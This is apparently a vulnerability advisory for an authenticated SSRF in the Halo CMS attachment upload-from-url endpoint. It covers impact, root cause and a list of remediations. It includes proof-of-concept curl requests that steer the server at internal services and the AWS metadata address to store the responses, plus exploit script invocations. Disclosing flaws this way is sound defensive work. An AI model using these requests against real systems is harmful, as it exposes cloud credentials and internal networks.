# VULN-002: Authenticated SSRF in Halo CMS Upload Service
<p align="left">
  <a href="https://twitter.com/abdulr7mann">
    <img src="https://img.shields.io/twitter/follow/abdulr7mann" alt="Twitter">
  </a>
</p>
**Published:** 2025-10-27
**Reporter:** @abdulr7mann
**Severity:** High (CVSS 8.5)

---

## Summary

Halo CMS versions 2.21 and likely all 2.x releases contain an authenticated Server-Side Request Forgery vulnerability in the attachment upload service. The `uploadFromUrl()` method in `DefaultAttachmentService.java` performs dual HTTP requests (HEAD and GET) to user-supplied URLs without validation, allowing authenticated users with content creator privileges to access internal networks, cloud metadata services, and store exfiltrated data as downloadable attachments.

- **Vulnerability ID:** VULN-002
- **CWE:** CWE-918 (Server-Side Request Forgery)
- **CVSS v3.1:** 8.5 High — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
- **Affected Versions:** Halo CMS v2.21 (confirmed), likely all 2.x
- **Authentication Required:** Content creator role (Post Author) or higher

---

## Impact

- Internal network probing and service discovery via authenticated users
- Cloud metadata server access with credential exfiltration to attachments
- Internal service enumeration and response storage
- Kubernetes API access in containerized deployments
- Data persistence advantage: responses saved as downloadable files

---

## Affected Components

- **Product:** Halo CMS
- **Versions:** v2.21 (confirmed), suspected all 2.x series
- **Component:** `application/src/main/java/run/halo/app/core/user/service/impl/DefaultAttachmentService.java:143`
- **Vulnerable Method:** `uploadFromUrl(@NonNull URL url, @NonNull String policyName, String groupName, String filename)`
- **API Endpoints:**
  - `/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url` (User Center)
  - `/apis/api.console.halo.run/v1alpha1/attachments/-/upload-from-url` (Console)
- **RBAC Configuration:** Accessible via `role-template-uc-attachment-manager` granted to Post Author role

---

## Technical Details

The `uploadFromUrl()` method uses `ReactiveUrlDataBufferFetcher` to perform dual HTTP requests without URL validation. First, a HEAD request retrieves metadata (Content-Type, filename), then a GET request downloads the full content. No validation is performed on target URLs, allowing requests to private IP addresses, cloud metadata endpoints, and internal services. Response content is downloaded and stored as an attachment in Halo's storage system, providing persistent access to exfiltrated data.

**Root Cause:** Missing URL validation, no private IP filtering, dual SSRF requests with content persistence, overly permissive RBAC (content creators have access).

---

## Proof of Concept

**Setup:**
```bash
docker run --add-host=host.docker.internal:host-gateway -d -p 8090:8090 halohub/halo:2.21
# Complete initial setup and create user account
```

**Exploit (requires authentication):**
```bash
# Authenticate and obtain session cookie
# See exploit.py for automated RSA-based authentication

# SSRF to canary - observe HEAD + GET requests
curl -X POST -H "Content-Type: application/json" -H "Cookie: SESSION=<token>" \
  -d '{"url":"http://host.docker.internal:8889/test","filename":"canary.txt"}' \
  "http://localhost:8090/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"

# Internal service access with content exfiltration
curl -X POST -H "Content-Type: application/json" -H "Cookie: SESSION=<token>" \
  -d '{"url":"http://127.0.0.1:8090/actuator/health","filename":"internal.json"}' \
  "http://localhost:8090/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"

# AWS metadata exfiltration (stored as downloadable attachment)
curl -X POST -H "Content-Type: application/json" -H "Cookie: SESSION=<token>" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/","filename":"aws-metadata.txt"}' \
  "http://localhost:8090/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"
```

**Automated PoC:**
```bash
python3 exploit.py http://localhost:8090 --username user --password pass
python3 exploit.py http://localhost:8090 --username user --password pass --target "http://internal-db:5432"
```

See [detailed technical analysis](deep-technical-analysis.md) for comprehensive exploitation methodology including authentication framework.

---

## Remediation

**Immediate Actions:**
- Update to latest, or:
- Restrict `/attachments/-/upload-from-url` to admin-only access
- Implement URL allowlist for approved external storage domains
- Deploy network-level egress filtering

**Recommended Fixes:**
- Implement strict URL allowlist (trusted CDN domains only)
- Block all private IP ranges (RFC 1918, loopback, link-local, cloud metadata)
- Validate resolved IP addresses before and after DNS lookup (prevent DNS rebinding)
- Restrict URL schemes to HTTPS only
- Separate RBAC permissions: regular users upload local files, admins only for external URLs
- Remove `attachments/upload-from-url` from `role-template-uc-attachment-manager`
- Create admin-only role for external URL uploads
- Implement content-type and size validation
- Add comprehensive security logging with alerting on suspicious patterns

---

## References

- [Technical Analysis & Authentication Framework](deep-technical-analysis.md)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

